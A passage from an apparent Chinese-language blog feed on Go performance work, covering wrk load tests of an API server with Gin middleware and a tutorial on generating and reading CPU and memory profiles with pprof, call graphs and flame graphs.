(inline)<br>.../internal/pkg/middleware.RequestID.func1<br>.../internal/pkg/middleware.Context.func1<br>github.com/gin-gonic/gin.CustomRecoveryWithWriter.func1<br>.../internal/pkg/middleware.LoggerWithConfig.func1<br>.../internal/pkg/middleware.NoCache<br>github.com/tpkeeper/gin-dump.DumpWithOptions.func1<br><br></code></pre></td></tr></table></figure><p>可以看到， <code>middleware.RequestID.func1</code>、 <code>middleware.Context.func1</code>、 <code>gin.CustomRecoveryWithWriter.func1</code>、 <code>middleware.LoggerWithConfig.func1</code> 等，这些耗时较久的函数都是我们加载的Gin中间件。这些中间件消耗了大量的CPU时间，所以我们可以选择性加载这些中间件，删除一些不需要的中间件，来优化API Server的性能。</p><p>假如我们暂时不需要这些中间件，也可以通过配置iam-apiserver的配置文件，将 <code>server.middlewares</code> 设置为空或者注释掉，然后重启iam-apiserver。重启后，再次执行 <code>wrktest.sh</code> 测试性能，并跟原生的HTTP Server性能进行对比，对比结果如下面2张图所示：</p><p><img src="https://static001.geekbang.org/resource/image/7b/c2/7bc94be0d44a5ac54cd0e199d2612ec2.png?wh=640x480" alt="img"></p><p><img src="https://static001.geekbang.org/resource/image/88/a7/88e9fdfe7ba14061e979d0195b45cca7.png?wh=640x480" alt="img"></p><p>可以看到，删除无用的Gin中间件后，API Server的性能有了很大的提升，并发数为 <code>200</code> 时性能最好，此时QPS为 <code>47812</code>，响应时间为 <code>4.33``ms</code>，成功率为 <code>100.00``%</code>。在并发数为 <code>50000</code> 的时候，其QPS是原生HTTP Server的 <code>75.02%</code>。</p><h3 id="API接口性能参考"><a href="#API接口性能参考" class="headerlink" title="API接口性能参考"></a>API接口性能参考</h3><p>不同团队对API接口的性能要求不同，同一团队对每个API接口的性能要求也不同，所以并没有一个统一的数值标准来衡量API接口的性能，但可以肯定的是，性能越高越好。在这里给出一个参考值（并发数可根据需要选择），如下表所示：</p><p><img src="https://static001.geekbang.org/resource/image/58/7c/581fc922afedaf36379c5a5d723ebd7c.jpg?wh=2248x585" alt="img"></p><h2 id="API-Server性能测试注意事项"><a href="#API-Server性能测试注意事项" class="headerlink" title="API Server性能测试注意事项"></a>API Server性能测试注意事项</h2><p>在进行API Server性能测试时，要考虑到API Server的性能影响因素。影响API Server性能的因素很多，大致可以分为两类，分别是Web框架的性能和API接口的性能。另外，在做性能测试时，还需要确保测试环境是一致的，最好是一个干净的测试环境。</p><h3 id="Web框架性能"><a href="#Web框架性能" class="headerlink" title="Web框架性能"></a>Web框架性能</h3><p>Web框架的性能至关重要，因为它会影响我们的每一个API接口的性能。</p><p>在设计阶段，我们会确定所使用的Web框架，这时候我们需要对Web框架有个初步的测试，确保我们选择的Web框架在性能和稳定性上都足够优秀。当整个Go后端服务开发完成之后，在上线之前，我们还需要对Web框架再次进行测试，确保按照我们最终的使用方式，Web框架仍然能够保持优秀的性能和稳定性。</p><p>我们通常会通过API接口来测试Web框架的性能，例如健康检查接口 <code>/healthz</code>。我们需要保证该API接口足够简单，API接口里面不应该掺杂任何逻辑，只需要象征性地返回一个很小的返回内容即可。比如，这一讲中我们通过 <code>/healthz</code> 接口来测试Web框架的性能：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go">s.GET(<span class="hljs-string">&quot;/healthz&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>    core.WriteResponse(c, <span class="hljs-literal">nil</span>, <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">string</span>&#123;<span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-string">&quot;ok&quot;</span>&#125;)<br>&#125;)<br><br></code></pre></td></tr></table></figure><p>接口中只调用了 <code>core.WriteResponse</code> 函数，返回了 <code>&#123;&quot;status&quot;:&quot;ok&quot;&#125;</code>。这里使用 <code>core.WriteResponse</code> 函数返回请求数据，而不是直接返回 <code>ok</code> 字符串，这样做是为了保持API接口返回格式统一。</p><h3 id="API接口性能"><a href="#API接口性能" class="headerlink" title="API接口性能"></a>API接口性能</h3><p>除了测试Web框架的性能，我们还可能需要测试某些重要的API接口，甚至所有API接口的性能。为了测试API接口在真实场景下的接口性能，我们会使用wrk这类HTTP压力测试工具，来模拟多个API请求，进而分析API的性能。</p><p>因为会模拟大量的请求，这时候测试写类接口，例如 <code>Create</code>、 <code>Update</code>、 <code>Delete</code> 等会存在一些问题，比如可能在数据库中插入了很多数据，导致磁盘空间被写满或者数据库被压爆。所以，针对写类接口，我们可以借助单元测试，来测试其性能。根据我的开发经验，写类接口通常不会有性能问题，反而读类接口更可能遇到性能问题。针对读类接口，我们可以使用wrk这类HTTP压力测试工具来进行测试。</p><h3 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h3><p>在做性能&#x2F;压力测试时，为了不影响生产环境，要确保在测试环境进行压测，并且测试环境的网络不能影响到生产环境的网络。另外，为了更好地进行性能对比和分析，也要保证我们的测试方法和测试环境是一致的。这就要求我们最好将性能测试自动化，并且每次在同一个测试环境进行测试。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>在项目上线前，我们需要对API接口进行性能测试。通常API接口的性能延时要小于 <code>500ms</code> ，如果大于这个值，需要考虑优化性能。在进行性能测试时，需要确保每次测试都有一个一致的测试环境，这样不同测试之间的数据才具有可对比性。推荐了一个比较优秀的性能测试工具 <code>wrk</code> ，我们可以编写shell脚本，将wrk的性能测试数据自动绘制成图，方便我们查看、对比性能。</p><p>如果发现API接口的性能不符合预期，我们可以借助 <code>go tool pprof</code> 工具来分析性能。在 <code>go tool pprof</code> 交互界面，执行 <code>top -cum</code> 命令查看累积采样时间，根据累积采样时间确定影响性能的代码，并优化代码。优化后，再进行测试，如果不满足，继续分析API接口的性能。如此往复，直到API接口的性能满足预期为止。</p><h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><p>1.孔令飞，<a href="https://time.geekbang.org/column/article/410205">Go 语言项目开发实战</a></p>]]></content>
    
    
    <categories>
      
      <category>golang</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>golang</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Go性能分析（上）：如何分析 GO 代码的性能？</title>
    <link href="/2022/11/27/Go%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%8A%EF%BC%89%EF%BC%9A%E5%A6%82%E4%BD%95%E5%88%86%E6%9E%90%20GO%20%E4%BB%A3%E7%A0%81%E7%9A%84%E6%80%A7%E8%83%BD%EF%BC%9F/"/>
    <url>/2022/11/27/Go%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%8A%EF%BC%89%EF%BC%9A%E5%A6%82%E4%BD%95%E5%88%86%E6%9E%90%20GO%20%E4%BB%A3%E7%A0%81%E7%9A%84%E6%80%A7%E8%83%BD%EF%BC%9F/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"># Go 性能分析（上）：如何分析 Go 代码的性能？<blockquote><p>本文章主要内容引用自：1.孔令飞，<a href="https://time.geekbang.org/column/article/410205">Go 语言项目开发实战</a>  ，2.郝林，<a href="https://time.geekbang.org/column/article/69812">Go 语言核心 36 讲</a></p></blockquote><h2 id="为什么要关注性能？"><a href="#为什么要关注性能？" class="headerlink" title="为什么要关注性能？"></a>为什么要关注性能？</h2><p>作为开发人员，我们一般都局限在功能上的单元测试中，对一些性能上的细节往往不会太关注。但是，如果我们在上线的时候对项目的整体性能没有一个全面的了解，随着请求量越来越大，可能会出现各种各样的问题，比如CPU占用高、内存使用率高、请求延时高等。为了避免这些性能瓶颈，我们在开发的过程中需要通过一定的手段，来对程序进行性能分析。</p><p>Go语言已经为开发者内置了很多性能调优、监控的工具和方法，这大大提升了我们profile分析的效率，借助这些工具，我们可以很方便地对Go程序进行性能分析。这些 API 主要存在于：runtime&#x2F;pprof；net&#x2F;http&#x2F;pprof；runtime&#x2F;trace；</p><p>在进行性能分析时，我们会先借助一些工具和包，生成性能数据文件，然后再通过 <code>pprof</code> 工具分析性能数据文件，从而分析代码的性能。那么接下来，我们就分别来看下如何执行这两步操作。</p><h2 id="生成性能数据文件"><a href="#生成性能数据文件" class="headerlink" title="生成性能数据文件"></a>生成性能数据文件</h2><p>要查看性能数据，需要先生成性能数据文件。生成性能数据文件有三种方法，分别是通过命令行、通过代码和通过 <code>net/http/pprof</code> 包。这些工具和包会分别生成CPU和内存性能数据。</p><p>接下来，我们就来看下这三种方法分别是如何生成性能数据文件的。</p><h3 id="1-通过命令行生成性能数据文件"><a href="#1-通过命令行生成性能数据文件" class="headerlink" title="1.通过命令行生成性能数据文件"></a>1.通过命令行生成性能数据文件</h3><p>我们可以使用 <code>go test -cpuprofile</code> 来生成性能测试数据。进入 <a href="https://github.com/marmotedu/iam/tree/v1.0.8/internal/apiserver/service/v1">internal&#x2F;apiserver&#x2F;service&#x2F;v1</a> 目录，执行以下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ go <span class="hljs-built_in">test</span> -bench=<span class="hljs-string">&quot;.*&quot;</span> -cpuprofile cpu.profile -memprofile mem.profile<br>goos: linux<br>goarch: amd64<br>pkg: github.com/marmotedu/iam/internal/apiserver/service/v1<br>cpu: AMD EPYC Processor<br>BenchmarkListUser-8        280   4283077 ns/op<br>PASS<br>ok  github.com/marmotedu/iam/internal/apiserver/service/v11.798s<br><br></code></pre></td></tr></table></figure><p>上面的命令会在当前目录下生成3个文件：</p><ul><li>v1.test，测试生成的二进制文件，进行性能分析时可以用来解析各种符号。</li><li>cpu.profile，CPU性能数据文件。</li><li>mem.profile，内存性能数据文件。</li></ul><h3 id="2-通过代码生成性能数据文件"><a href="#2-通过代码生成性能数据文件" class="headerlink" title="2.通过代码生成性能数据文件"></a>2.通过代码生成性能数据文件</h3><p>我们还可以使用代码来生成性能数据文件，例如 <a href="https://github.com/marmotedu/gopractise-demo/blob/master/pprof/pprof.go">pprof.go</a> 文件：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;os&quot;</span><br><span class="hljs-string">&quot;runtime/pprof&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>cpuOut, _ := os.Create(<span class="hljs-string">&quot;cpu.out&quot;</span>)<br><span class="hljs-keyword">defer</span> cpuOut.Close()<br>pprof.StartCPUProfile(cpuOut)<br><span class="hljs-keyword">defer</span> pprof.StopCPUProfile()<br><br>memOut, _ := os.Create(<span class="hljs-string">&quot;mem.out&quot;</span>)<br><span class="hljs-keyword">defer</span> memOut.Close()<br><span class="hljs-keyword">defer</span> pprof.WriteHeapProfile(memOut)<br><br>Sum(<span class="hljs-number">3</span>, <span class="hljs-number">5</span>)<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Sum</span><span class="hljs-params">(a, b <span class="hljs-type">int</span>)</span></span> <span class="hljs-type">int</span> &#123;<br><span class="hljs-keyword">return</span> a + b<br>&#125;<br><br></code></pre></td></tr></table></figure><p>运行 <code>pprof.go</code> 文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ go run pprof.go<br><br></code></pre></td></tr></table></figure><p>运行 <code>pprof.go</code> 文件后，会在当前目录生成 <code>cpu.profile</code> 和 <code>mem.profile</code> 性能数据文件。</p><h3 id="3-通过-net-http-pprof-生成性能数据文件"><a href="#3-通过-net-http-pprof-生成性能数据文件" class="headerlink" title="3.通过 net/http/pprof 生成性能数据文件"></a>3.通过 <code>net/http/pprof</code> 生成性能数据文件</h3><p>如果要分析HTTP Server的性能，我们可以使用 <code>net/http/pprof</code> 包来生成性能数据文件。</p><p>IAM项目使用Gin框架作为HTTP引擎，所以IAM项目使用了 <code>github.com/gin-contrib/pprof</code> 包来启用HTTP性能分析。 <code>github.com/gin-contrib/pprof</code> 包是 <code>net/http/pprof</code> 的一个简单封装，通过封装使pprof的功能变成了一个Gin中间件，这样可以根据需要加载pprof中间件。</p><p><code>github.com/gin-contrib/pprof</code> 包中的 <a href="https://github.com/gin-contrib/pprof/blob/v1.3.0/pprof.go">pprof.go</a> 文件中有以下代码：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Register</span><span class="hljs-params">(r *gin.Engine, prefixOptions ...<span class="hljs-type">string</span>)</span></span> &#123;<br>    prefix := getPrefix(prefixOptions...)<br><br>    prefixRouter := r.Group(prefix)<br>    &#123;<br>        ...<br>        prefixRouter.GET(<span class="hljs-string">&quot;/profile&quot;</span>, pprofHandler(pprof.Profile))<br>        ...<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">pprofHandler</span><span class="hljs-params">(h http.HandlerFunc)</span></span> gin.HandlerFunc &#123;<br>    handler := http.HandlerFunc(h)<br>    <span class="hljs-keyword">return</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>        handler.ServeHTTP(c.Writer, c.Request)<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>通过上面的代码，可以看到 <code>github.com/gin-contrib/pprof</code> 包将 <code>net/http/pprof.Profile</code> 转换成了 <code>gin.HandlerFunc</code>，也就是Gin中间件。</p><p>要开启HTTP性能分析，只需要在代码中注册pprof提供的HTTP Handler即可（位于 <a href="https://github.com/marmotedu/iam/blob/v1.0.8/internal/pkg/server/genericapiserver.go#L75-L77">internal&#x2F;pkg&#x2F;server&#x2F;genericapiserver.go</a> 文件中）：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// install pprof handler</span><br><span class="hljs-keyword">if</span> s.enableProfiling &#123;<br>    pprof.Register(s.Engine)<br>&#125;<br><br></code></pre></td></tr></table></figure><p>上面的代码根据配置 <code>--feature.profiling</code> 来判断是否开启HTTP性能分析功能。我们开启完HTTP性能分析，启动HTTP服务iam-apiserver后，即可访问 <code>http:// x.x.x.x:8080/debug/pprof</code>（ <code>x.x.x.x</code> 是Linux服务器的地址）来查看profiles信息。profiles信息如下图所示：</p><p><img src="https://static001.geekbang.org/resource/image/6a/6b/6a5fc33b87b6322162c39e9209b6396b.png?wh=1520x1170" alt="img"></p><p>我们可以通过以下命令，来获取CPU性能数据文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ curl http://127.0.0.1:8080/debug/pprof/profile -o cpu.profile<br><br></code></pre></td></tr></table></figure><p>执行完上面的命令后，需要等待30s，pprof会采集这30s内的性能数据，我们需要在这段时间内向服务器连续发送多次请求，请求的频度可以根据我们的场景来决定。30s之后， <code>/debug/pprof/profile</code> 接口会生成CPU profile文件，被curl命令保存在当前目录下的cpu.profile文件中。</p><p>同样的，我们可以执行以下命令来生成内存性能数据文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ curl http://127.0.0.1:8080/debug/pprof/heap -o mem.profile<br><br></code></pre></td></tr></table></figure><p>上面的命令会自动下载heap文件，并被curl命令保存在当前目录下的mem.profile文件中。</p><p>我们可以使用 <code>go tool pprof  [mem|cpu].profile</code> 命令来分析HTTP接口的CPU和内存性能。我们也可以使用命令 <code>go tool pprof http://127.0.0.1:8080/debug/pprof/profile</code>，或者 <code>go tool pprof http://127.0.0.1:8080/debug/pprof/heap</code>，来直接进入pprof工具的交互Shell中。 <code>go tool pprof</code> 会首先下载并保存CPU和内存性能数据文件，然后再分析这些文件。</p><p>通过上面的三种方法，我们生成了cpu.profile和mem.profile，接下来我们就可以使用 <code>go tool pprof</code> 来分析这两个性能数据文件，进而分析我们程序的CPU和内存性能了。下面，我来具体讲讲性能分析的过程。</p><h2 id="性能分析"><a href="#性能分析" class="headerlink" title="性能分析"></a>性能分析</h2><p>使用 <code>go tool pprof</code>，来对性能进行分析的流程，你可以参考下图：</p><p><img src="https://static001.geekbang.org/resource/image/d4/da/d41d03c41283ea00308682a9yy0400da.jpg?wh=1920x665" alt="img"></p><p>接下来，我先给你介绍下pprof工具，再介绍下如何生成性能数据，最后再分别介绍下CPU和内存性能分析方法。</p><h3 id="pprof工具介绍"><a href="#pprof工具介绍" class="headerlink" title="pprof工具介绍"></a>pprof工具介绍</h3><p><a href="https://github.com/google/pprof">pprof</a> 是一个Go程序性能分析工具，用它可以访问并分析性能数据文件，它还会根据我们的要求，提供高可读性的输出信息。Go在语言层面上集成了profile采样工具，只需在代码中简单地引入 <code>runtime/pprof</code> 或者 <code>net/http/pprof</code> 包，即可获取程序的profile文件，并通过profile文件来进行性能分析。</p><p><code>net/http/pprof</code> 基于 <code>runtime/pprof</code> 包进行封装，并在 HTTP 端口上暴露出来。</p><h3 id="生成性能数据"><a href="#生成性能数据" class="headerlink" title="生成性能数据"></a>生成性能数据</h3><p>我们在做性能分析时，主要是对内存和CPU性能进行分析。为了分析内存和CPU的性能，我们需要先生成性能数据文件。在 IAM 源码中，也有包含性能测试的用例，下面我会借助 IAM 源码中的性能测试用例，来介绍如何分析程序的性能。</p><p>进入 <a href="https://github.com/marmotedu/iam/tree/v1.0.8/internal/apiserver/service/v1">internal&#x2F;apiserver&#x2F;service&#x2F;v1</a> 目录，user_test.go文件包含了性能测试函数 <a href="https://github.com/marmotedu/iam/blob/v1.0.8/internal/apiserver/service/v1/user_test.go#L27-L41">BenchmarkListUser</a>，执行以下命令来生成性能数据文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ go <span class="hljs-built_in">test</span> -benchtime=30s -benchmem -bench=<span class="hljs-string">&quot;.*&quot;</span> -cpuprofile cpu.profile -memprofile mem.profile<br>goos: linux<br>goarch: amd64<br>pkg: github.com/marmotedu/iam/internal/apiserver/service/v1<br>cpu: AMD EPYC Processor<br>BenchmarkListUser-8        175 204523677 ns/op   15331 B/op     268 allocs/op<br>PASS<br>ok  github.com/marmotedu/iam/internal/apiserver/service/v156.514s<br><br></code></pre></td></tr></table></figure><p>上面的命令会在当前目录下产生 <code>cpu.profile</code>、 <code>mem.profile</code> 性能数据文件，以及 <code>v1.test</code> 二进制文件。接下来，我们基于 <code>cpu.profile</code>、 <code>mem.profile</code>、 <code>v1.test</code> 文件来分析代码的CPU和内存性能。为了获取足够的采样数据，我们将benchmark时间设置为 <code>30s</code>。</p><p>在做性能分析时，我们可以采取不同的手段来分析性能，比如分析采样图、分析火焰图，还可以使用 <code>go tool pprof</code> 交互模式，查看函数CPU和内存消耗数据。下面我会运用这些方法，来分析CPU性能和内存性能。</p><h3 id="CPU性能分析"><a href="#CPU性能分析" class="headerlink" title="CPU性能分析"></a>CPU性能分析</h3><p>在默认情况下，Go语言的运行时系统会以100 Hz的的频率对CPU使用情况进行采样，也就是说每秒采样100次，每10毫秒采样一次。每次采样时，会记录正在运行的函数，并统计其运行时间，从而生成CPU性能数据。</p><p>上面我们已经生成了CPU性能数据文件 <code>cpu.profile</code>，接下来会运用上面提到的三种方法来分析该性能文件，优化性能。</p><p><strong>方法一：分析采样图</strong></p><p>要分析性能，最直观的方式当然是看图，所以首先我们需要生成采样图，生成过程可以分为两个步骤。</p><p><strong>第一步</strong>，确保系统安装了 <code>graphviz</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo yum -y install graphviz.x86_64<br><br></code></pre></td></tr></table></figure><p><strong>第二步</strong>，执行 <code>go tool pprof</code> 生成调用图：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ go tool pprof -svg cpu.profile &gt; cpu.svg  <span class="hljs-comment"># svg 格式</span><br>$ go tool pprof -pdf cpu.profile &gt; cpu.pdf <span class="hljs-comment"># pdf 格式</span><br>$ go tool pprof -png cpu.profile &gt; cpu.png <span class="hljs-comment"># png 格式</span><br><br></code></pre></td></tr></table></figure><p>以上命令会生成 <code>cpu.pdf</code>、 <code>cpu.svg</code> 和 <code>cpu.png</code> 文件，文件中绘制了函数调用关系以及其他采样数据。如下图所示：</p><p><img src="https://static001.geekbang.org/resource/image/a7/0c/a737e4d5f25775150545558872aa9e0c.png?wh=438x1259" alt="img"></p><p>这张图片由有向线段和矩形组成。 <strong>我们先来看有向线段的含义。</strong></p><p>有向线段描述了函数的调用关系，矩形包含了CPU采样数据。从图中，我们看到没箭头的一端调用了有箭头的一端，可以知道 <code>v1.(*userService).List</code> 函数调用了 <code>fake.(*policies).List</code>。</p><p>线段旁边的数字 <code>90ms</code> 则说明， <code>v1.(*userService).List</code> 调用 <code>fake.(*policies).List</code> 函数，在采样周期内，一共耗用了 <code>90ms</code>。通过函数调用关系，我们可以知道某个函数调用了哪些函数，并且调用这些函数耗时多久。</p><p>这里，我们再次解读下图中调用关系中的重要信息：</p><p><img src="https://static001.geekbang.org/resource/image/70/32/70e964bc6d8f0b28d434cce47c4e1132.png?wh=835x818" alt="img"></p><p><code>runtime.schedule</code> 的累积采样时间（140ms）中，有10ms来自于 <code>runtime.goschedImpl</code> 函数的直接调用，有70ms来自于 <code>runtime.park_m</code> 函数的直接调用。这些数据可以说明 <code>runtime.schedule</code> 函数分别被哪些函数调用，并且调用频率有多大。也因为这个原因，函数 <code>runtime.goschedImpl</code> 对函数 <code>runtime.schedule</code> 的调用时间必定小于等于函数 <code>runtime.schedule</code> 的累积采样时间。</p><p><strong>我们再来看下矩形里的采样数据。</strong> 这些矩形基本都包含了3类信息：</p><ul><li>函数名&#x2F;方法名，该类信息包含了包名、结构体名、函数名&#x2F;方法名，方便我们快速定位到函数&#x2F;方法，例如 <code>fake(*policies)List</code> 说明是fake包，policies结构体的List方法。</li><li>本地采样时间，以及它在采样总数中所占的比例。本地采样时间是指采样点落在该函数中的总时间。</li><li>累积采样时间，以及它在采样总数中所占的比例。累积采样时间是指采样点落在该函数，以及被它直接或者间接调用的函数中的总时间。</li></ul><p>我们可以通过 <code>OutDir</code> 函数来解释本地采样时间和累积采样时间这两个概念。 <code>OutDir</code> 函数如下图所示：</p><p><img src="https://static001.geekbang.org/resource/image/f5/a5/f55c738c09471094a9a8498e9b73faa5.png?wh=1020x558" alt="img"></p><p>整个函数的执行耗时，我们可以认为是累积采样时间，包含了白色部分的代码耗时和红色部分的函数调用耗时。白色部分的代码耗时，可以认为是本地采样时间。</p><p>通过累积采样时间，我们可以知道函数的总调用时间，累积采样时间越大，说明调用它所花费的CPU时间越多。但你要注意，这并不一定说明这个函数本身是有问题的，也有可能是函数所调用的函数性能有瓶颈，这时候我们应该根据函数调用关系顺藤摸瓜，去寻找这个函数直接或间接调用的函数中最耗费CPU时间的那些。</p><p>如果函数的本地采样时间很大，就说明这个函数自身耗时（除去调用其他函数的耗时）很大，这时候需要我们分析这个函数自身的代码，而不是这个函数直接或者间接调用函数的代码。</p><p>采样图中，矩形框面积越大，说明这个函数的累积采样时间越大。那么，如果一个函数分析采样图中的矩形框面积很大，这时候我们就要认真分析了，因为很可能这个函数就有需要优化性能的地方。</p><p><strong>方法二：分析火焰图</strong></p><p>上面介绍的采样图，其实在分析性能的时候还不太直观，这里我们可以通过生成火焰图，来更直观地查看性能瓶颈。火焰图是由Brendan Gregg大师发明的专门用来把采样到的堆栈轨迹（Stack Trace）转化为直观图片显示的工具，因整张图看起来像一团跳动的火焰而得名。</p><p><code>go tool pprof</code> 提供了 <code>-http</code> 参数，可以使我们通过浏览器浏览采样图和火焰图。执行以下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ go tool pprof -http=<span class="hljs-string">&quot;0.0.0.0:8081&quot;</span> v1.test cpu.profile<br><br></code></pre></td></tr></table></figure><p>然后访问 <code>http://x.x.x.x:8081/</code>（ <code>x.x.x.x</code> 是执行 <code>go tool pprof</code> 命令所在服务器的IP地址），则会在浏览器显示各类采样视图数据，如下图所示：</p><p><img src="https://static001.geekbang.org/resource/image/91/9d/91dab469d3d61dd4302d3ef5d483609d.png?wh=1920x679" alt="img"></p><p>上面的UI页面提供了不同的采样数据视图：</p><ul><li>Top，类似于 linux top 的形式，从高到低排序。</li><li>Graph，默认弹出来的就是该模式，也就是上一个图的那种带有调用关系的图。</li><li>Flame Graph：pprof 火焰图。</li><li>Peek：类似于 Top 也是从高到底的排序。</li><li>Source：和交互命令式的那种一样，带有源码标注。</li><li>Disassemble：显示所有的总量。</li></ul><p>接下来，我们主要来分析火焰图。在UI界面选择 <strong>Flame Graph（VIEW -&gt; Flame Graph）</strong>，就会展示火焰图，如下图所示：</p><p><img src="https://static001.geekbang.org/resource/image/33/e9/33e427f1a2419e0420e9ef8e9ddd69e9.png?wh=1920x609" alt="img"></p><p>火焰图主要有下面这几个特征：</p><ul><li>每一列代表一个调用栈，每一个格子代表一个函数。</li><li>纵轴展示了栈的深度，按照调用关系从上到下排列。最下面的格子代表采样时，正在占用CPU的函数。</li><li>调用栈在横向会按照字母排序，并且同样的调用栈会做合并，所以一个格子的宽度越大，说明这个函数越可能是瓶颈。</li><li>火焰图格子的颜色是随机的暖色调，方便区分各个调用信息。</li></ul><p>查看火焰图时，格子越宽的函数，就越可能存在性能问题，这时候，我们就可以分析该函数的代码，找出问题所在。</p><p><strong>方法三：用</strong> <code>go tool pprof</code> <strong>交互模式查看详细数据</strong></p><p>我们可以执行 <code>go tool pprof</code> 命令，来查看CPU的性能数据文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ go tool pprof v1.test cpu.profile<br>File: v1.test<br>Type: cpu<br>Time: Aug 17, 2021 at 2:17pm (CST)<br>Duration: 56.48s, Total samples = 440ms ( 0.78%)<br>Entering interactive mode (<span class="hljs-built_in">type</span> <span class="hljs-string">&quot;help&quot;</span> <span class="hljs-keyword">for</span> commands, <span class="hljs-string">&quot;o&quot;</span> <span class="hljs-keyword">for</span> options)<br>(pprof)<br><br></code></pre></td></tr></table></figure><p><code>go tool pprof</code> 输出了很多信息：</p><ul><li>File，二进制可执行文件名称。</li><li>Type，采样文件的类型，例如cpu、mem等。</li><li>Time，生成采样文件的时间。</li><li>Duration，程序执行时间。上面的例子中，程序总执行时间为 <code>37.43s</code>，采样时间为 <code>42.37s</code>。采样程序在采样时，会自动分配采样任务给多个核心，所以总采样时间可能会大于总执行时间。</li><li>(pprof)，命令行提示，表示当前在 <code>go tool</code> 的 <code>pprof</code> 工具命令行中， <code>go tool</code> 还包括 <code>cgo</code>、 <code>doc</code>、 <code>pprof</code>、 <code>trace</code> 等多种命令。</li></ul><p>执行 <code>go tool pprof</code> 命令后，会进入一个交互shell。在这个交互shell中，我们可以执行多个命令，最常用的命令有三个，如下表所示：</p><p><img src="https://static001.geekbang.org/resource/image/d1/98/d10a2c6cbfa4e35fc4efc9a3760d1b98.jpg?wh=1920x1196" alt="img"></p><p>我们在交互界面中执行 <code>top</code> 命令，可以查看性能样本数据：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 